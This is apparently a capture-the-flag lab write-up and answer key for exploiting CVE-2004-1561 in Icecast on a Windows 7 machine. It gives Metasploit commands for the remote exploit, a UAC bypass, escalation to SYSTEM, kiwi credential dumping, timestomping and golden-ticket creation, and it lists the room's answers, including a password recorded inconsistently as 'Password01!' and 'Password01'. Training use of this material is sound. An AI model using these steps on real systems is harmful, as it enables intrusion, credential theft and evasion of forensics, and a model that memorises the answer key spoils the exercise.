### Vulnerability Hunting
- At this point, the room just gives me what exploit to use for the Icecast vulnerability
    - [CVE-2004-1561: Icecast 2.0.1 and earlier Buffer Overflow via HTTP Headers Allows Remote Code Execution](https://www.cvedetails.com/cve/CVE-2004-1561/)
    - Buffer overflow in Icecast 2.0.1 and earlier allows remote attackers to execute arbitrary code via an HTTP request with a large number of headers
    - This has a CVSS of 7.5

## 💥 Exploitation

### Step 1: Metasploit
- Find this vulnerability in metasploit
    - `msfconsole` and then `search icecast`
    - `use exploit/windows/http/icecast_header`
    - `set RHOSTS TARGET_IP`
    - `exploit`
- We find that we are in meterepreter shell now
    - To find who is running the Icecast process, use `ps` to list
        - We find that `Dark-PC\Dark` is running it
        - We also find that we are running `x64`
    - To find information about the system, use `sysinfo`
        - This is in `Build 7601`

### Step 2: Further Recon
- In order to get further insight into what we can do with this system, we can run an exploit suggester
    - `run post/multi/recon/local_exploit_suggester`
    - The room wants us to use this one: `exploit/windows/local/bypassuac_eventvwr`

### Step 3: Privilege Escalation
- Background the current process and `use exploit/windows/local/bypassuac_eventvwr`
    - Set the session option to the background session `set SESSION SESSION_ID`
- `exploit` the system
    - Check for privilege with `getprivs`
    - We can take control of files with `SeTakeOwnershipPrivilege`
- Migrate to the process that can give privilege escalation
    - Needs to be same architecture with same permissions as `lsass` service
    - `ps` to find `spoolsv.exe`
    - `migrate -N spoolsv.exe` to migrate to that process
    - Now, when you `getuid` the user is now `NT AUTHORITY\SYSTEM`

### Step 4: Credential Harvesting
- Next, we can harvest passwords with `load kiwi`
    - This adds `kiwi` to our meterpreter
    - Using `help` shows us new Kiwi commands
    - We can now get passwords by using `creds_all`
    - We get Dark's password: `Password01!`
- With the credentials we got, now we can remote in via MSRDP (3389)

## 📝 Task Answers
- One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on? → `3389`
- What service did nmap identify as running on port 8000? (First word of this service) → `Icecast`
- What does Nmap identify as the hostname of the machine? (All caps for the answer) → `DARK-PC`
- What is the Impact Score for this vulnerability? Use https://www.cvedetails.com → `6.4`
- What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000 → `CVE-2004-1561`
- What is the full path (starting with exploit) for the exploitation module?  → `exploit/windows/http/icecast_header`
- Run the command `show options`. What is the only required setting which currently is blank? → `RHOSTS`
- What's the name of the shell we have now? → `meterpreter`
- What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'Metasploit' module. → `Dark`
- What build of Windows is the system? → `7601`
- First, what is the architecture of the process we're running? → `x64`
- What is the full path (starting with exploit/) for the first returned exploit? → `exploit/windows/local/bypassuac_eventvwr`
- Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option? → `LHOST`
- What permission listed allows us to take ownership of files? → `SeTakeOwnershipPrivilege`
- What's the name of the printer service? → `spoolsv.exe`
- Let's check what user we are now with the command `getuid`. What user is listed? → `NT AUTHORITY\SYSTEM`
- Which command allows up to retrieve all credentials? → `creds_all`
- What is Dark's password?  → `Password01`
- What command allows us to dump all of the password hashes stored on the system? → `hashdump`
- While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time? → `screenshare`
- How about if we wanted to record from a microphone attached to the system? → `record_mic`
- To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this?  → `timestomp`
- Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this? → `golden_ticket_create`
